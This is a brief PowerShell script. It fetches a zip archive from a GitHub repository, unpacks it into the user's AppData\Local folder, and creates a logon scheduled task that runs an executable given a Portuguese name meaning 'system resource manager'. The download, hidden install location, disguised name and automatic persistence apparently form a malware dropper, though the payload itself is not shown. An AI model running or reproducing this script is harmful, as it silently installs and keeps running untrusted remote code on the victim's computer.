Invoke-RestMethod "https://github.com/n0shadow/config/raw/refs/heads/main/Server.zip" -OutFile "a.zip";
Expand-Archive -Path "a.zip" -DestinationPath ".";
Remove-Item "a.zip";
$usrPath = $PWD.Path
$usr = Split-Path $usrPath -Leaf
$dest = Join-Path $usrPath "AppData\Local\Server"
$exec = Join-Path $dest "Gerenciador de recursos do sistema.exe"
Move-Item "Server" $dest -Force

#$realDmn = (Get-WmiObject Win32_ComputerSystem).PartOfDomain
#$dmn = if ($realDmn) {
#    (Get-WmiObject Win32_ComputerSystem).Domain
#} else {
#    $env:COMPUTERNAME
#}

#$acc = "$dmn\$usr"
$acc = $usr

$tsk = "GerenciadorRecursos"

schtasks.exe /create `
    /tn $tsk `
    /tr "'$exec'" `
    /sc onlogon `
    /ru "$acc" `
    /rl limited
